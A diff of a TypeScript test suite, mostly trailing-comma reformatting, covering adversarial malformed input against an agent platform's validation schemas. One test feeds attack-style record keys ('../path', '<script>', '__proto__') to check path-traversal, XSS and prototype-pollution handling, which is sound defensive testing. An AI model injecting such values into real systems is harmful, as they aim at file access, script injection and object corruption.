@@ -1338,7 +1431,7 @@ describe("adversarial malformed input: path traversal in text fields", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     // The id field is .trim().min(1) with no charset restriction.
@@ -1358,7 +1451,7 @@ describe("adversarial malformed input: SubAgent schema boundary attacks", () => 
       expectedOutputs: ["output-1"],
       riskClass: "R2",
       handoffCriteria: ["done"],
-      guardrails: ["no-side-effects"]
+      guardrails: ["no-side-effects"],
     });
 
     expect(result.success).toBe(false);
@@ -1375,7 +1468,7 @@ describe("adversarial malformed input: SubAgent schema boundary attacks", () => 
       expectedOutputs: ["output-1"],
       riskClass: "R2",
       handoffCriteria: ["done"],
-      guardrails: ["no-side-effects"]
+      guardrails: ["no-side-effects"],
     });
 
     expect(result.success).toBe(false);
@@ -1389,7 +1482,7 @@ describe("adversarial malformed input: SubAgent schema boundary attacks", () => 
       coordinationStrategy: "parallel",
       roles: [],
       successCriteria: ["done"],
-      createdAt: "2026-06-09T12:00:00.000Z"
+      createdAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(false);
@@ -1405,7 +1498,7 @@ describe("adversarial malformed input: SubAgent schema boundary attacks", () => 
       expectedOutputs: ["output-1"],
       riskClass: "R2",
       handoffCriteria: ["done"],
-      guardrails: ["no-side-effects"]
+      guardrails: ["no-side-effects"],
     }));
 
     const result = SubAgentPlanSchema.safeParse({
@@ -1415,7 +1508,7 @@ describe("adversarial malformed input: SubAgent schema boundary attacks", () => 
       coordinationStrategy: "parallel",
       roles,
       successCriteria: ["done"],
-      createdAt: "2026-06-09T12:00:00.000Z"
+      createdAt: "2026-06-09T12:00:00.000Z",
     });
 
     expect(result.success).toBe(false);
@@ -1431,7 +1524,7 @@ describe("adversarial malformed input: SubAgent schema boundary attacks", () => 
       expectedOutputs: ["output-1"],
       riskClass: "R2",
       handoffCriteria: ["done"],
-      guardrails: ["no-side-effects"]
+      guardrails: ["no-side-effects"],
     });
 
     expect(result.success).toBe(false);
@@ -1447,7 +1540,7 @@ describe("adversarial malformed input: SubAgent schema boundary attacks", () => 
       expectedOutputs: ["output-1"],
       riskClass: "R2",
       handoffCriteria: ["done"],
-      guardrails: ["no-side-effects"]
+      guardrails: ["no-side-effects"],
     });
 
     expect(result.success).toBe(true);
@@ -1461,13 +1554,21 @@ describe("adversarial malformed input: AgentResultSchema boundary attacks", () =
       summary: "Test",
       executionMode: "governed_specialist",
       implementationTier: "production",
-      explanation: "Test explanation"
+      explanation: "Test explanation",
     };
 
-    expect(AgentResultSchema.safeParse({ ...base, confidence: -0.1 }).success).toBe(false);
-    expect(AgentResultSchema.safeParse({ ...base, confidence: 1.1 }).success).toBe(false);
-    expect(AgentResultSchema.safeParse({ ...base, confidence: 0 }).success).toBe(true);
-    expect(AgentResultSchema.safeParse({ ...base, confidence: 1 }).success).toBe(true);
+    expect(
+      AgentResultSchema.safeParse({ ...base, confidence: -0.1 }).success,
+    ).toBe(false);
+    expect(
+      AgentResultSchema.safeParse({ ...base, confidence: 1.1 }).success,
+    ).toBe(false);
+    expect(
+      AgentResultSchema.safeParse({ ...base, confidence: 0 }).success,
+    ).toBe(true);
+    expect(
+      AgentResultSchema.safeParse({ ...base, confidence: 1 }).success,
+    ).toBe(true);
   });
 
   it("rejects evidence_refs items exceeding max length (500 chars)", () => {
@@ -1478,7 +1579,7 @@ describe("adversarial malformed input: AgentResultSchema boundary attacks", () =
       executionMode: "governed_specialist",
       implementationTier: "production",
       explanation: "Test",
-      evidenceRefs: ["a".repeat(501)]
+      evidenceRefs: ["a".repeat(501)],
     });
 
     expect(result.success).toBe(false);
@@ -1492,7 +1593,7 @@ describe("adversarial malformed input: AgentResultSchema boundary attacks", () =
       executionMode: "governed_specialist",
       implementationTier: "production",
       explanation: "Test",
-      riskFlags: ["a".repeat(201)]
+      riskFlags: ["a".repeat(201)],
     });
 
     expect(result.success).toBe(false);
@@ -1504,7 +1605,7 @@ describe("adversarial malformed input: ApprovalPreviewSchema boundary attacks", 
     const result = ApprovalPreviewSchema.safeParse({
       actionType: "send",
       summary: "",
-      target: "client@example.com"
+      target: "client@example.com",
     });
 
     expect(result.success).toBe(false);
@@ -1514,7 +1615,7 @@ describe("adversarial malformed input: ApprovalPreviewSchema boundary attacks", 
     const result = ApprovalPreviewSchema.safeParse({
       actionType: "send",
       summary: "Send email",
-      target: ""
+      target: "",
     });
 
     expect(result.success).toBe(false);
@@ -1524,7 +1625,7 @@ describe("adversarial malformed input: ApprovalPreviewSchema boundary attacks", 
     const result = ApprovalPreviewSchema.safeParse({
       actionType: "send",
       summary: "   ",
-      target: "client@example.com"
+      target: "client@example.com",
     });
 
     // z.string().min(1) without .trim() accepts whitespace-only strings.
@@ -1542,7 +1643,7 @@ describe("adversarial malformed input: GoalSchema derivation boundary attacks", 
       status: "planned",
       tasks: [],
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     // GoalSchema transforms the input and adds a default task if empty.
@@ -1566,7 +1667,7 @@ describe("adversarial malformed input: combined attack vectors", () => {
       source: "test",
       sensitivity: "low",
       createdAt: "2026-06-09T12:00:00.000Z",
-      updatedAt: "2026-06-09T12:00:00.000Z"
+      updatedAt: "2026-06-09T12:00:00.000Z",
     });
 
     // Accepted as data -- downstream must sanitize/escape, not the schema.
@@ -1592,9 +1693,9 @@ describe("adversarial malformed input: combined attack vectors", () => {
         "": "empty key",
         "../path": "traversal",
         "<script>": "xss",
-        "__proto__": "pollution",
-        constructor: "prototype attack"
-      }
+        __proto__: "pollution",
+        constructor: "prototype attack",
+      },
     });
 
     // z.record() accepts arbitrary keys. We verify that __proto__ does NOT pollute
